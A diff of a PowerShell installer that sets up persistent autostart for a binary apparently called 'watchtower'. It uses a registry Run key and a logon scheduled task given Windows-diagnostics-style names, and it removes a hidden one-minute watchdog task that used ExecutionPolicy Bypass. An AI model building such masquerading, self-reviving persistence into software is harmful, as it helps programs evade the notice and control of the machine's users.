@@ -331,23 +331,18 @@ try {
     Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -Value "\`"$BinaryPath\`" --config \`"$ConfigPath\`"" -Force -ErrorAction SilentlyContinue
 } catch {}
 
-# Method B: Scheduled Task at user logon (Power-resilient, no battery stop, no 72h limit, auto-restart)
+# Method B: Scheduled Task at user logon (Power-resilient, no battery stop, no 72h limit, native Task Scheduler auto-restart)
 try {
+    # Clean up any legacy or watchdog tasks to prevent console window flashing
+    Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
+    Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
     Unregister-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
+
     $taskAction = New-ScheduledTaskAction -Execute $BinaryPath -Argument "--config \`"$ConfigPath\`""
     $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
     $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
     Register-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -User $env:USERNAME -Force -ErrorAction SilentlyContinue | Out-Null
-} catch {}
-
-# Method C: Watchdog Scheduled Task (Checks and revives process every 1 minute)
-try {
-    Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
-    $watchdogScript = "if (-not (Get-Process -Name 'watchtower' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$BinaryPath' -ArgumentList '--config', '$ConfigPath' -WindowStyle Hidden }"
-    $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \`"$watchdogScript\`""
-    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 9999)
-    $watchdogSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 5) -StartWhenAvailable
-    Register-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Action $watchdogAction -Trigger $watchdogTrigger -Settings $watchdogSettings -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 # 6. Immediately launch the process in background for the current user session
